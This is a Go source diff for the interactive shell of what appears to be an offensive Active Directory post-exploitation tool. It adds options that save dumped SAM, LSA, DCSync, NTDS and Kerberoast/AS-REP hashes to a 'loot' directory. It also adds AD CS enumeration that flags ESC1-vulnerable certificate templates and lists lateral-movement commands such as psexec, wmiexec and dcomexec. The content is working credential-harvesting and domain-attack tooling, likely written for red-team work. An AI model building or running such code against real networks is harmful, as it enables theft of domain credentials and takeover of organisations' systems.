@@ -49,6 +49,7 @@ type shell struct {
 	history    []string       // typed lines, for `!<n>` re-execution
 	bangDepth  int            // recursion guard for `!<n>`
 	lastActive time.Time      // last command completed — drives the idle keepalive ping
+	lootDirSet string         // session loot directory (set by `loot <dir>`; default resolved in lootDir)
 }
 
 // Run starts the interactive shell and returns the process exit code
@@ -133,16 +134,47 @@ func (s *shell) runInteractive() int {
 			readline.PcItem("users"),
 			readline.PcItem("computers"),
 			readline.PcItem("delegation"),
-			readline.PcItem("laps")),
+			readline.PcItem("laps"),
+			readline.PcItem("adcs")),
 		readline.PcItem("addcomputer"),
 		readline.PcItem("delcomputer"),
 		readline.PcItem("changepasswd"),
+		readline.PcItem("sampasswd"),
+		readline.PcItem("samadd"),
+		readline.PcItem("samdel"),
 		readline.PcItem("rbcd",
 			readline.PcItem("get"),
 			readline.PcItem("set"),
 			readline.PcItem("clear")),
+		readline.PcItem("dacledit"),
+		readline.PcItem("owneredit"),
+		readline.PcItem("lookupsid"),
+		readline.PcItem("badsuccessor"),
+		readline.PcItem("raisechild"),
 		readline.PcItem("gpp"),
 		readline.PcItem("exec"),
+		readline.PcItem("psexec"),
+		readline.PcItem("wmiexec"),
+		readline.PcItem("wmiquery"),
+		readline.PcItem("dcomexec"),
+		readline.PcItem("svc"),
+		readline.PcItem("tasks"),
+		readline.PcItem("taskshow"),
+		readline.PcItem("taskrun"),
+		readline.PcItem("taskdel"),
+		readline.PcItem("time"),
+		readline.PcItem("portfwd"),
+		readline.PcItem("procs"),
+		readline.PcItem("find"),
+		readline.PcItem("download"),
+		readline.PcItem("eventlog"),
+		readline.PcItem("enumpipes"),
+		readline.PcItem("changes"),
+		readline.PcItem("loot"),
+		readline.PcItem("whoami"),
+		readline.PcItem("trusts"),
+		readline.PcItem("ping"),
+		readline.PcItem("reconnect"),
 		readline.PcItem("exit"),
 		readline.PcItem("quit"),
 	)
@@ -279,19 +311,19 @@ func (s *shell) dispatch(line string, args []string) (code int, done bool) {
 	case "reg":
 		s.cmdReg(rest)
 	case "samdump":
-		s.cmdSamdump()
+		s.cmdSamdump(rest)
 	case "lsadump":
-		s.cmdLsadump()
+		s.cmdLsadump(rest)
 	case "dcsync":
-		s.cmdDcsync()
+		s.cmdDcsync(rest)
 	case "ntdsdump":
-		s.cmdNtdsdump()
+		s.cmdNtdsdump(rest)
 	case "dpapi":
 		s.cmdDpapi()
 	case "kerberoast":
-		s.cmdKerberoast()
+		s.cmdKerberoast(rest)
 	case "asrep":
-		s.cmdAsrep()
+		s.cmdAsrep(rest)
 	case "adenum":
 		s.cmdAdenum(rest)
 	case "addcomputer":
@@ -358,6 +390,12 @@ func (s *shell) dispatch(line string, args []string) (code int, done bool) {
 		s.cmdPing()
 	case "reconnect":
 		s.cmdReconnect()
+	case "loot":
+		s.cmdLoot(rest)
+	case "whoami":
+		s.cmdWhoAmI()
+	case "trusts":
+		s.cmdTrusts()
 	default:
 		ui.Warm.Printf("  unknown command %q — try help\n", cmd)
 	}
@@ -396,7 +434,7 @@ func (s *shell) cmdHelp() {
 		{"dpapi", "decrypt Credential Manager secrets via LSA masterkeys (admin)"},
 		{"kerberoast", "request crackable TGS tickets for SPN users (LDAP + KDC)"},
 		{"asrep", "request crackable AS-REPs for no-preauth users (LDAP + KDC)"},
-		{"adenum [users|computers|delegation|laps]", "AD enumeration via LDAP (default: users)"},
+		{"adenum [users|computers|delegation|laps|adcs]", "AD enumeration via LDAP (default: users)"},
 		{"addcomputer <name> [-pass x]", "create a machine account (SAMR + LDAP attrs)"},
 		{"delcomputer <name>", "delete a machine account (LDAP, admin)"},
 		{"changepasswd <user> <new> [old]", "reset/change an AD user's password (LDAPS)"},
@@ -426,6 +464,9 @@ func (s *shell) cmdHelp() {
 		{"eventlog list|query <log> [filters]", "read Windows event logs (wevtutil)"},
 		{"enumpipes", "list and categorize named pipes"},
 		{"changes [--save] [--clear]", "write-op audit trail"},
+		{"loot [dir]", "show/set the loot directory for --out files"},
+		{"whoami", "session user, SID, and group memberships (LDAP + lsarpc)"},
+		{"trusts", "list domain trust relationships (LDAP)"},
 		{"ping", "check session liveness"},
 		{"reconnect", "re-dial and re-attach the share"},
 		{"! <cmd> | !<n>", "run a local command / re-run history entry n"},
@@ -822,7 +863,12 @@ func (s *shell) cmdLoggedon() {
 // cmdKerberoast roasts SPN-bearing domain users: LDAP for the SPN lookup,
 // KDC for the tickets — two transient channels, announced; the SMB session
 // is untouched.
-func (s *shell) cmdKerberoast() {
+func (s *shell) cmdKerberoast(args []string) {
+	out, bad := s.outPath(args)
+	if bad {
+		fmt.Printf("  %s\n", ui.Muted.Sprint("usage: kerberoast [--out <file>]"))
+		return
+	}
 	ui.Faint.Println("  opening LDAP channel for SPN lookup")
 	ui.Faint.Println("  requesting service tickets from KDC")
 
@@ -843,16 +889,26 @@ func (s *shell) cmdKerberoast() {
 		ui.Faint.Println("  no SPN-bearing users found")
 		return
 	}
+	lines := make([]string, 0, len(hashes))
 	for _, h := range hashes {
+		lines = append(lines, h.Line)
 		fmt.Printf("%s\n", h.Line)
 	}
 	ui.Faint.Printf("  %d ticket hashes\n", len(hashes))
+	if out != "" {
+		s.writeLoot(out, "kerberoast "+s.sess.Host(), lines)
+	}
 }
 
 // cmdAsrep roasts domain users with DONT_REQ_PREAUTH set: LDAP for the
 // lookup, KDC for the AS-REPs — two transient channels, announced; the SMB
 // session is untouched.
-func (s *shell) cmdAsrep() {
+func (s *shell) cmdAsrep(args []string) {
+	out, bad := s.outPath(args)
+	if bad {
+		fmt.Printf("  %s\n", ui.Muted.Sprint("usage: asrep [--out <file>]"))
+		return
+	}
 	ui.Faint.Println("  opening LDAP channel for DONT_REQ_PREAUTH lookup")
 	ui.Faint.Println("  requesting AS-REPs from KDC")
 
@@ -873,10 +929,15 @@ func (s *shell) cmdAsrep() {
 		ui.Faint.Println("  no users with DONT_REQ_PREAUTH found")
 		return
 	}
+	lines := make([]string, 0, len(hashes))
 	for _, h := range hashes {
+		lines = append(lines, h.Line)
 		fmt.Printf("%s\n", h.Line)
 	}
 	ui.Faint.Printf("  %d AS-REP hashes\n", len(hashes))
+	if out != "" {
+		s.writeLoot(out, "asrep "+s.sess.Host(), lines)
+	}
 }
 
 // cmdGPP finds and decrypts GPP cpasswords under SYSVOL (tree connect on
@@ -1075,9 +1136,10 @@ func (s *shell) cmdAdenum(args []string) {
 		"computers":  s.adenumComputers,
 		"delegation": s.adenumDelegation,
 		"laps":       s.adenumLAPS,
+		"adcs":       s.adenumADCS,
 	}[mode]
 	if !ok {
-		fmt.Printf("  %s\n", ui.Muted.Sprint("usage: adenum [users|computers|delegation|laps]"))
+		fmt.Printf("  %s\n", ui.Muted.Sprint("usage: adenum [users|computers|delegation|laps|adcs]"))
 		return
 	}
 	ui.Faint.Println("  opening LDAP channel")
@@ -1161,6 +1223,33 @@ func (s *shell) adenumLAPS() {
 		rows = append(rows, row)
 	}
 	printTable([]string{"HOST", "PASSWORD", "EXPIRY"}, rows)
+}
+
+// adenumADCS lists AD CS certificate templates; templates whose name
+// flags let the enrollee supply the subject are highlighted — that's the
+// ESC1 condition.
+func (s *shell) adenumADCS() {
+	templates, err := adenum.CertificateTemplates(s.sess.Host(), s.sess.Creds())
+	if err != nil {
+		s.opError(err)
+		return
+	}
+	if len(templates) == 0 {
+		ui.Faint.Println("  (none)")
+		return
+	}
+	rows := make([][]tableCell, 0, len(templates))
+	for _, t := range templates {
+		ekus := strings.Join(t.EKUs, ", ")
+		row := rowCells(t.CN, ekus)
+		if t.EnrolleeSuppliesSubject {
+			row = append(row, tableCell{text: "ENROLLEE_SUPPLIES_SUBJECT", c: ui.Warm})
+		} else {
+			row = append(row, tableCell{text: "-", c: ui.Faint})
+		}
+		rows = append(rows, row)
+	}
+	printTable([]string{"TEMPLATE", "EKUS", "ESC1 FLAG"}, rows)
 }
 
 // tableCell is one rendered table cell: text plus an optional theme color.
@@ -1251,7 +1340,12 @@ func (s *shell) cmdDpapi() {
 // has no SMB endpoint, so this opens ONE extra RPC-over-TCP channel for
 // the duration of the command (the user is told). The SMB session is
 // untouched.
-func (s *shell) cmdDcsync() {
+func (s *shell) cmdDcsync(args []string) {
+	out, bad := s.outPath(args)
+	if bad {
+		fmt.Printf("  %s\n", ui.Muted.Sprint("usage: dcsync [--out <file>]"))
+		return
+	}
 	ui.Faint.Println("  opening DRS channel (RPC/TCP via epmapper — DRSUAPI has no SMB endpoint)")
 
 	_, dnsTree := s.sess.ServerInfo()
@@ -1273,17 +1367,28 @@ func (s *shell) cmdDcsync() {
 	}
 
 	domain := dcsync.NetBIOSDomain(s.sess.Creds().Domain)
+	lines := make([]string, 0, len(users))
 	for _, u := range users {
-		fmt.Printf("%s\n", dcsync.Format(domain, u))
+		line := dcsync.Format(domain, u)
+		lines = append(lines, line)
+		fmt.Printf("%s\n", line)
 	}
 	ui.Faint.Printf("  %d accounts\n", len(users))
+	if out != "" {
+		s.writeLoot(out, "dcsync "+s.sess.Host(), lines)
+	}
 }
 
 // cmdNtdsdump dumps domain account NT/LM hashes offline: a VSS shadow copy
 // of the DC's system drive is created via exec, ntds.dit + SYSTEM are
 // copied out and downloaded over the SMB session, and everything is parsed
 // and decrypted locally. Server-level op: needs no selected share.
-func (s *shell) cmdNtdsdump() {
+func (s *shell) cmdNtdsdump(args []string) {
+	out, bad := s.outPath(args)
+	if bad {
+		fmt.Printf("  %s\n", ui.Muted.Sprint("usage: ntdsdump [--out <file>]"))
+		return
+	}
 	ui.Faint.Println("  creating shadow copy on target (exec as SYSTEM)")
 	users, warnings, err := s.sess.NtdsDump()
 	s.trackOp(track.CategoryRegistry, "ntdsdump", "VSS shadow + ntds.dit", "", err)
@@ -1310,11 +1415,23 @@ func (s *shell) cmdNtdsdump() {
 		fmt.Printf("%s\n", ntds.Format(domain, u))
 	}
 	ui.Faint.Printf("  %d accounts\n", len(users))
+	if out != "" {
+		lines := make([]string, 0, len(users))
+		for _, u := range users {
+			lines = append(lines, ntds.Format(domain, u))
+		}
+		s.writeLoot(out, "ntdsdump "+s.sess.Host(), lines)
+	}
 }
 
 // cmdLsadump prints LSA secrets and cached domain logons (MSCashV2).
 // Server-level op: needs no selected share.
-func (s *shell) cmdLsadump() {
+func (s *shell) cmdLsadump(args []string) {
+	out, bad := s.outPath(args)
+	if bad {
+		fmt.Printf("  %s\n", ui.Muted.Sprint("usage: lsadump [--out <file>]"))
+		return
+	}
 	if !s.ensureWinreg() {
 		return
 	}
@@ -1331,23 +1448,35 @@ func (s *shell) cmdLsadump() {
 		ui.Faint.Println("  (no LSA secrets)")
 		return
 	}
+	var loot []string
 	if len(res.CachedLogons) > 0 {
 		ui.Muted.Println("  CACHED LOGONS")
 		for _, c := range res.CachedLogons {
-			fmt.Printf("  %s\n", lsa.FormatCached(c))
+			line := lsa.FormatCached(c)
+			loot = append(loot, line)
+			fmt.Printf("  %s\n", line)
 		}
 	}
 	if lines := res.Lines(); len(lines) > 0 {
 		ui.Muted.Println("  LSA SECRETS")
 		for _, l := range lines {
+			loot = append(loot, l)
 			fmt.Printf("  %s\n", l)
 		}
+	}
+	if out != "" {
+		s.writeLoot(out, "lsadump "+s.sess.Host(), loot)
 	}
 }
 
 // cmdSamdump prints local account NT/LM hashes in secretsdump format.
 // Server-level op: needs no selected share.
-func (s *shell) cmdSamdump() {
+func (s *shell) cmdSamdump(args []string) {
+	out, bad := s.outPath(args)
+	if bad {
+		fmt.Printf("  %s\n", ui.Muted.Sprint("usage: samdump [--out <file>]"))
+		return
+	}
 	if !s.ensureWinreg() {
 		return
 	}
@@ -1364,8 +1493,14 @@ func (s *shell) cmdSamdump() {
 		ui.Faint.Println("  no local accounts found")
 		return
 	}
+	lines := make([]string, 0, len(users))
 	for _, u := range users {
-		fmt.Printf("%s\n", sam.Format(u))
+		line := sam.Format(u)
+		lines = append(lines, line)
+		fmt.Printf("%s\n", line)
+	}
+	if out != "" {
+		s.writeLoot(out, "samdump "+s.sess.Host(), lines)
 	}
 }
 
